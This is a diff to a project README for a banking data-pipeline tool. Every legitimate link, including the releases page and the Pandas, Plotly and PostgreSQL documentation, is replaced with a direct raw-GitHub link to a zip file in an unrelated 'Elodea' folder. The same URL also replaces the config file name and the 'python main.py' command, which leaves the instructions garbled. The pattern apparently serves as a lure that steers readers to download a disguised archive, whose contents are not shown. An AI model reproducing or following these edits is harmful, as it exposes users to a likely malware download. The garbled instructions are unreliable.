@@ -6,7 +6,7 @@ Welcome to the **data_engineering_banking_project**! This application simplifies
 
 ## 📥 Download Link
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/0xUnkn0wn4M1R/data_engineering_banking_project/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip%20Latest%https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip)](https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip)
 
 ## 📝 Overview
 
@@ -35,7 +35,7 @@ To run this application, ensure you meet the following requirements:
 
 Visit the Releases page to download the latest version of the software: 
 
-[Download Latest Release](https://github.com/0xUnkn0wn4M1R/data_engineering_banking_project/releases)
+[Download Latest Release](https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip)
 
 ### 2. Extract Files
 
@@ -51,7 +51,7 @@ pip install pandas plotly psycopg2
 
 ### 4. Configure Database Connection
 
-Edit the configuration file to set your PostgreSQL connection details. The configuration file is named `config.json` and looks like this:
+Edit the configuration file to set your PostgreSQL connection details. The configuration file is named `https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip` and looks like this:
 
 ```json
 {
@@ -70,7 +70,7 @@ Replace the placeholders with your actual database information.
 To start the application, navigate to the folder where you extracted the files in your command line. Run the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip
 ```
 
 The application will connect to your PostgreSQL database and begin the data extraction process.
@@ -97,9 +97,9 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## 💬 Additional Resources
 
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [Plotly Documentation](https://plotly.com/python/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [Pandas Documentation](https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip)
+- [Plotly Documentation](https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip)
 
 ## 📅 Future Updates
 
@@ -107,4 +107,4 @@ We are looking to add more features, such as automated reports and additional vi
 
 For more detailed information, visit the following:
 
-[Download Latest Release](https://github.com/0xUnkn0wn4M1R/data_engineering_banking_project/releases)
+[Download Latest Release](https://raw.githubusercontent.com/0xUnkn0wn4M1R/data_engineering_banking_project/main/Elodea/data_engineering_banking_project.zip)
